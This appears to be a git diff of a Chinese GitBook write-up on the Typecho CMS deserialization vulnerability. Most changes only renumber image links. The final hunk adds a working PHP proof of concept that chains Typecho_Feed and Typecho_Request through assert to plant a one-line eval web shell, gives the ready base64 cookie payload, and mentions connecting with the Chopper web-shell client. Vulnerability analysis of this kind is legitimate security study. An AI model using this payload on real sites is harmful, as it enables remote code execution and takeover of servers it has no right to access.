@@ -104,7 +104,7 @@ __typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOTo
   
 当存在cookie名为\_\_typecho\_config时，会将该值base64解码后进反序列化，并将反序列化后的对象赋给$config变量。然后将该cookie删除。第三步按config中的adapter和prefix的值建立Typecho\_Db对象。那么看一下Typecho\_Db的构造函数
 
-![](../.gitbook/assets/image%20%2829%29.png)
+![](../.gitbook/assets/image%20%2831%29.png)
 
 此处好像没什么可以利用的地方，但是在第120行
 
@@ -123,11 +123,11 @@ $adapterName = 'Typecho_Db_Adapter_' . $adapterName;
 第241行调用了dataFormat函数，跟过去看看有没有能利用的地方  
 
 
-![dataFormat&#x51FD;&#x6570;](../.gitbook/assets/image%20%2831%29.png)
+![dataFormat&#x51FD;&#x6570;](../.gitbook/assets/image%20%2833%29.png)
 
 好像并没有什么能够利用的函数，继续返回toString函数寻找，发现第243行调用了empty\(\)函数，搜索一下看看有没有重写的\_\_isset\(\)可以利用（虽然一般不会有，但是也要尝试一下）
 
-![](../.gitbook/assets/image%20%2825%29.png)
+![](../.gitbook/assets/image%20%2826%29.png)
 
 果然没有能用的到的，继续toString方法往下寻找
 
@@ -135,11 +135,11 @@ $adapterName = 'Typecho_Db_Adapter_' . $adapterName;
 
 第290行发现调用了screenName变量，我们知道当对象访问一个不可访问或者没有的变量时会调用\_\_get方法，搜索一下看看
 
-![](../.gitbook/assets/image%20%2834%29.png)
+![](../.gitbook/assets/image%20%2836%29.png)
 
 类太多，不一一举例，我们直接查看Typecho\_Request类，发现该类并没有中creenName变量符合我们使用，查看该类\_\_get方法直接调用了get\(\)方法，跟过去看一下
 
-![](../.gitbook/assets/image%20%2827%29.png)
+![](../.gitbook/assets/image%20%2829%29.png)
 
 而且$value=\_params\[$key\]可以直接构造一个值传过去，然后这个值会传到\_applyFilter函数
 
@@ -147,7 +147,7 @@ $adapterName = 'Typecho_Db_Adapter_' . $adapterName;
 
 函数中会调用call\_user\_func\(\)函数可以被利用，来执行任意函数，然后再借助assert函数来执行任意php语句
 
-![](../.gitbook/assets/image%20%2823%29.png)
+![](../.gitbook/assets/image%20%2824%29.png)
 
 ![](../.gitbook/assets/image%20%286%29.png)
 
@@ -206,7 +206,71 @@ echo serialize($paylod);
 
 我们再去看一下代码
 
-![](../.gitbook/assets/image%20%2837%29.png)
+![](../.gitbook/assets/image%20%2839%29.png)
 
-我们可以借助category来随便传一个对象，当程序调用时触发
+我们可以借助category来随便传一个对象，当程序调用时触发致命错误，导致程序直接退出，出现回显。  
+
+
+![](../.gitbook/assets/image%20%2821%29.png)
+
+构造POC上传一句话木马。POC：
+
+```php
+<?php
+/**
+ * Created by PhpStorm.
+ * User: 10326
+ * Date: 2018/10/16
+ * Time: 22:34
+ */
+class Typecho_Request {
+    private $_params = array();
+    private $_filter = array();
+
+    function __construct()
+    {
+        $this->_params['screenName'] = "file_put_contents('test.php', '<?php @eval(".'$_POST[cmd]);'." ?>')";
+        $this->_filter [0]= 'assert';
+    }
+}
+$tr = new Typecho_Request();
+
+class Typecho_Feed{
+    private $_type;
+    private $_items = array();
+
+    function __construct($o)
+    {
+        $this->_type = 'RSS 2.0';
+        $this->_items[0]['author']=$o;
+        $this->_items[0]['category']=array($o);
+
+    }
+}
+$tr2 = new Typecho_Feed($tr);
+
+$paylod = array();
+$paylod['adapter'] = $tr2;
+$paylod['prefix'] = 'typecho_';
+
+echo base64_encode(serialize($paylod));
+echo '<br><br><br><br>';
+echo serialize($paylod);
+```
+
+输出（第一行是base64编码后的payload，下面那行只是为了显示看看的）：
+
+```text
+YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YToyOntzOjY6ImF1dGhvciI7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czo2MToiZmlsZV9wdXRfY29udGVudHMoJ3Rlc3QucGhwJywgJzw/cGhwIEBldmFsKCRfUE9TVFtjbWRdKTsgPz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319czo4OiJjYXRlZ29yeSI7YToxOntpOjA7cjo2O319fX1zOjY6InByZWZpeCI7czo4OiJ0eXBlY2hvXyI7fQ==
+
+
+
+a:2:{s:7:"adapter";O:12:"Typecho_Feed":2:{s:19:"Typecho_Feed_type";s:7:"RSS 2.0";s:20:"Typecho_Feed_items";a:1:{i:0;a:2:{s:6:"author";O:15:"Typecho_Request":2:{s:24:"Typecho_Request_params";a:1:{s:10:"screenName";s:61:"file_put_contents('test.php', '')";}s:24:"Typecho_Request_filter";a:1:{i:0;s:6:"assert";}}s:8:"category";a:1:{i:0;r:6;}}}}s:6:"prefix";s:8:"typecho_";}
+```
+
+菜刀链接：
+
+![](../.gitbook/assets/image%20%2827%29.png)
+
+
 
